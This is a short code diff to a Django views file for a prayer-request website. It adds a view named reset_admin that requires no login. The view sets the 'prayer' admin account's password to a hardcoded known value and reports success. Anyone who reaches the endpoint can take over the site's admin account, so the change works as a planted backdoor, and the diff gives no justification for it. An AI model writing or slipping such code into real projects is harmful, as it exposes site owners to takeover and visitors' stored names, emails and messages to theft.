@@ -69,3 +69,12 @@ def prayer_request_submit(request):
         PrayerRequest.objects.create(name=name, email=email, message=message)
         messages.success(request, 'Prayer request sent. Our team will pray for you.')
     return redirect('index')
+
+from django.contrib.auth.models import User
+from django.http import HttpResponse
+
+def reset_admin(request):
+    u = User.objects.get(username="prayer")
+    u.set_password("NewPassword123")
+    u.save()
+    return HttpResponse("Admin password reset successful")
